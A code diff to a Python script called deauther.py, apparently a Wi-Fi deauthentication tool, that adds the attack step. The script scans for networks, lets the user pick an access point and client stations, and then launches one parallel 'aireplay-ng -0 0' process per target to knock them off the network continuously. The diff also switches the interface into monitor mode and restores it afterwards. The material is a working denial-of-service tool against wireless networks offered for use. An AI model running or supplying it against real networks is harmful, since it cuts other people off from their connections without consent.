@@ -3,6 +3,7 @@ import sys
 import os
 import pandas as pd
 import subprocess
+import multiprocessing
 
 def initial_check():
     if os.geteuid() != 0:
@@ -15,7 +16,7 @@ def initial_check():
         print(err_text+"\nUsage: deauther.py <interface>")
         sys.exit(1)
 
-def set_monitor():
+def get_mode():
     result = subprocess.run(["iwconfig", sys.argv[1]], capture_output=True, text=True)
     if result.returncode != 0:
         if "no wireless extensions" in result.stderr:
@@ -24,16 +25,19 @@ def set_monitor():
             print("Error:", result.stderr)
         sys.exit(1)
 
-    mode = None
     for line in result.stdout.splitlines():
         if "Mode:" in line:
-            mode = line.split(":")[1].split()[0]
-            break
-    if mode == "Monitor":
-        return
-    elif mode == "Managed":
+            mode = line.split(":")[1].split()[0].lower()
+            return mode
+
+    print("Mode can't be found...")
+    sys.exit(1)
+
+def set_mode(mode):
+    if mode in ("monitor", "managed"):
+        print(f"Setting {sys.argv[1]} to {mode} mode...")
         subprocess.run(["ifconfig", sys.argv[1], "down"])
-        subprocess.run(["iwconfig", sys.argv[1], "mode", "monitor"])
+        subprocess.run(["iwconfig", sys.argv[1], "mode", mode])
         subprocess.run(["ifconfig", sys.argv[1], "up"])
     else:
         print("Unknown mode error:", mode)
@@ -56,7 +60,6 @@ def get_networks():
                 break
 
     df_wifi = pd.read_csv("output-01.csv", nrows=start_row_station, skipinitialspace=True)
-    # df_station = pd.read_csv("output-01.csv", skiprows=start_row_station, skipinitialspace=True)
     os.remove("output-01.csv")
     df_wifi = df_wifi.dropna(subset=["BSSID", "ESSID"])
     return df_wifi
@@ -155,12 +158,40 @@ def select_targets(df):
         ids = parse_input(selection_str)
         targets = df.drop(ids)
     return targets.values
-    
+
+def run_command(target, bssid):
+    command = ["aireplay-ng", "-0", "0", "-a", bssid, "-c", target, "wlan0"]
+    subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+def deauth(bssid, targets):
+    print("Deauthenticating targets...")
+    processes = []
+    for target in targets:
+        process = multiprocessing.Process(target=run_command, args=[target, bssid])
+        process.start()
+        processes.append(process)
+    try:
+        for process in processes:
+            process.join()
+    except KeyboardInterrupt:
+        for process in processes:
+            process.terminate()
+        print("\nStopping deauth attack...")
+
 if __name__ == "__main__":
+    mode_changed = False
     initial_check()
-    set_monitor()
+    initial_mode = get_mode()
+
+    if initial_mode != "monitor":
+        set_mode("monitor")
+        mode_changed = True
+
     df_wifi = get_networks()
     bssid, channel = select_network(df_wifi)
     df_station = scan_network(bssid, channel)
     targets = select_targets(df_station)
     print(f"Targets:\n{targets}")
+    deauth(bssid, targets)
+
+    if mode_changed: set_mode(initial_mode)
